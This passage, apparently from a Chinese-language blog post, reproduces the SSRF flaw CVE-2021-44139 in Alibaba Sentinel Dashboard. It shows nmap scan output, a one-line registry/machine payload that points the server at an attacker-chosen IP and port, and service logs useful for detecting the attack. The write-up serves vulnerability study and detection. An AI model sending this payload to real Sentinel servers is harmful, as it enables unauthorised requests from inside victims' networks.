class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">sentinel_dashboard_cookie</span><span class="hljs-operator">=</span><span class="hljs-variable">BE654F45DE66F950E0710F8070194DEE</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GetRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Last</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">22</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Accept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>: <span class="hljs-variable">bytes</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>: <span class="hljs-variable">zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">901</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Fri</span>, <span class="hljs-number">23</span> <span class="hljs-title class_">Feb</span> <span class="hljs-number">2024</span> <span class="hljs-number">02</span>:<span class="hljs-number">50</span>:<span class="hljs-number">17</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span> <span class="hljs-variable">html</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span> <span class="hljs-keyword">class</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;no-js&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Sentinel</span> <span class="hljs-title class_">Dashboard</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">title</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;description&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Sentinel </span><br><span class="hljs-string">|     ,Sentinel Dashboard,Admin&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">meta</span> <span class="hljs-variable">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-variable">content</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;width=device-width&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/bootstrap.min.css&quot;</span> /<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/css/font-awesome.min.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./dist/css/app.css&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">link</span> <span class="hljs-variable">rel</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-variable">type</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;image/x-icon&quot;</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/static/favicon.ico&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">base</span> <span class="hljs-variable">href</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">head</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">body</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ng</span><span class="hljs-operator">-</span><span class="hljs-variable">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;sentinelDashboardApp&quot;</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">div</span> <span class="hljs-variable">ui</span><span class="hljs-operator">-</span><span class="hljs-variable">view</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span>/<span class="hljs-variable">div</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/jquery.min.js&quot;</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">script</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">script</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib/js/b</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 </span><br><span class="hljs-string">|     Allow: GET,HEAD,OPTIONS</span><br><span class="hljs-string">|     Content-Length: 0</span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|   RTSPRequest, Socks4, Socks5: </span><br><span class="hljs-string">|     HTTP/1.1 400 </span><br><span class="hljs-string">|     Date: Fri, 23 Feb 2024 02:50:17 GMT</span><br><span class="hljs-string">|_    Connection: close</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">|_http-title: Sentinel Dashboard</span><br><span class="hljs-string">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.94%I=7%D=2/23%Time=65D807E9%P=arm-apple-darwin23.2.0%r</span><br><span class="hljs-string">SF:(GetRequest,46C,&quot;</span><span class="hljs-variable">HTTP</span>/<span class="hljs-number">1</span>\<span class="hljs-number">.1</span>\<span class="hljs-variable">x20200</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nLast</span><span class="hljs-operator">-</span><span class="hljs-title class_">Modified</span>:\<span class="hljs-variable">x20Thu</span>,\<span class="hljs-variable">x2022</span>\<span class="hljs-variable">x</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">20</span>Feb\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2011</span>:<span class="hljs-number">38</span>:<span class="hljs-number">43</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nAccept</span><span class="hljs-operator">-</span><span class="hljs-title class_">Ranges</span>:\<span class="hljs-variable">x20bytes</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Type</span>:\<span class="hljs-variable">x20text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">UTF</span><span class="hljs-number">-8</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nContent</span><span class="hljs-operator">-</span><span class="hljs-title class_">Language</span>:\<span class="hljs-variable">x20zh</span><span class="hljs-operator">-</span><span class="hljs-title class_">Hans</span><span class="hljs-operator">-</span><span class="hljs-variable">CN</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>:\<span class="hljs-variable">x20901</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nDate</span>:\<span class="hljs-variable">x20Fri</span>,\<span class="hljs-variable">x2023</span>\<span class="hljs-variable">x20Feb</span>\<span class="hljs-variable">x202024</span>\<span class="hljs-variable">x2002</span>:<span class="hljs-number">50</span>:<span class="hljs-number">1</span><br><span class="hljs-variable">SF</span>:<span class="hljs-number">7</span>\<span class="hljs-variable">x20GMT</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">nConnection</span>:\<span class="hljs-variable">x20close</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span>\<span class="hljs-variable">r</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">!</span><span class="hljs-variable">doctype</span>\<span class="hljs-variable">x20html</span><span class="hljs-operator">&gt;</span>\<span class="hljs-variable">n</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">html</span>\<span class="hljs-variable">x20cl</span><br><span class="hljs-variable">SF</span>:ass<span class="hljs-operator">=</span>\<span class="hljs-string">&quot;no-js<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>charset=<span class="hljs-char escape_">\&quot;</span>utf-8<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&lt;title&gt;Sentinel<span class="hljs-char escape_">\x20</span>Dashboard&lt;/title&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>descripti</span><br><span class="hljs-string">SF:on<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>content=<span class="hljs-char escape_">\&quot;</span>Sentinel<span class="hljs-char escape_">\x20</span>\xe6\x8e\xa7\xe5<span class="hljs-char escape_">\x88</span>\xb6\xe5\x8f\xb0,Sent</span><br><span class="hljs-string">SF:inel<span class="hljs-char escape_">\x20</span>Dashboard,Admin<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;meta<span class="hljs-char escape_">\x20</span>name=<span class="hljs-char escape_">\&quot;</span>viewport<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>conte</span><br><span class="hljs-string">SF:nt=<span class="hljs-char escape_">\&quot;</span>width=device-width<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>hr</span><br><span class="hljs-string">SF:ef=<span class="hljs-char escape_">\&quot;</span>\./lib/css/bootstrap\.min\.css<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>/&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>sty</span><br><span class="hljs-string">SF:lesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./lib/css/font-awesome\.min\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>stylesheet<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./dist/css/app\.css<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;link</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>rel=<span class="hljs-char escape_">\&quot;</span>icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>image/x-icon<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>/static/favicon\.ic</span><br><span class="hljs-string">SF:o<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;base<span class="hljs-char escape_">\x20</span>href=<span class="hljs-char escape_">\&quot;</span>\./<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span>&lt;/head&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>&lt;body&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div\x</span><br><span class="hljs-string">SF:20ng-app=<span class="hljs-char escape_">\&quot;</span>sentinelDashboardApp<span class="hljs-char escape_">\&quot;</span>&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;div<span class="hljs-char escape_">\x20</span>ui-view&gt;&lt;/d</span><br><span class="hljs-string">SF:iv&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;/div&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/jquery\.min\.js</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\&quot;</span>&gt;&lt;/script&gt;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x20</span>&lt;script<span class="hljs-char escape_">\x20</span>src=<span class="hljs-char escape_">\&quot;</span>\./lib/js/b&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">75</span>,<span class="hljs-string">&quot;</span><br><span class="hljs-string">SF:HTTP/1\.1<span class="hljs-char escape_">\x20</span>200<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Allow:<span class="hljs-char escape_">\x20</span>GET,HEAD,OPTIONS<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:\x</span><br><span class="hljs-string">SF:200<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connect</span><br><span class="hljs-string">SF:ion:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>clos</span><br><span class="hljs-string">SF:e<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-variable">B6</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>sentinel_dashboard_cookie=BE654F45DE66F950E0710F8070194DEE;<span class="hljs-char escape_">\x20</span>Path</span><br><span class="hljs-string">SF:=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb\x</span><br><span class="hljs-string">SF:202024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">49</span><br><span class="hljs-variable">SF</span>:,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:1</span><br><span class="hljs-string">SF:7<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>4,<span class="hljs-number">49</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>40</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Fri,<span class="hljs-char escape_">\x20</span>23<span class="hljs-char escape_">\x20</span>Feb<span class="hljs-char escape_">\x20</span>2024<span class="hljs-char escape_">\x20</span>02:50:17<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Conne</span><br><span class="hljs-string">SF:ction:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>);<br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">11.61</span> <span class="hljs-variable">seconds</span><br>➜  <span class="hljs-title class_">Alibaba</span>_Sentinel_SSRF_CVE<span class="hljs-number">-2021</span><span class="hljs-number">-44139</span> <br><br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>payload:</p><p>h__p:&#x2F;&#x2F;ip&#x2F;registry&#x2F;machine?app&#x3D;40bdb&amp;appType&#x3D;0&amp;version&#x3D;0&amp;hostname&#x3D;VbxGe&amp;ip&#x3D;attackip&amp;port&#x3D;0</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="攻击排查"><a href="#攻击排查" class="headerlink" title="攻击排查"></a>攻击排查</h2><h3 id="服务日志"><a href="#服务日志" class="headerlink" title="服务日志"></a>服务日志</h3><p>攻击后服务会周期性访问payload中指定的ip和port组成的服务，可查询包含“Failed to fetch metric from”字符串的日志</p><p>测试过程中为 10.235.151.11:0</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">12</span>:<span class="hljs-number">12.108</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[O dispatcher 17]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654313000&amp;endTime=1708654319000&amp;refetch=false&gt;: socket timeout</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">23.873</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654320000&amp;endTime=1708654326000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">29.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654327000&amp;endTime=1708654333000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">36.878</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654334000&amp;endTime=1708654340000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">43.857</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654341000&amp;endTime=1708654347000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">50.864</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span class="hljs-selector-class">.MetricFetcher</span>   : Failed to fetch metric from &lt;http:<span class="hljs-comment">//10.235.151.11:0/metric?startTime=1708654348000&amp;endTime=1708654354000&amp;refetch=false&gt; (ConnectionException: Operation timed out)</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">02</span>-<span class="hljs-number">23</span> <span class="hljs-number">10</span>:<span class="hljs-number">13</span>:<span class="hljs-number">57.904</span> ERROR <span class="hljs-number">14834</span> --- <span class="hljs-selector-attr">[pool-3-thread-1]</span> c<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.dashboard</span><span class="hljs-selector-class">.metric</span><span 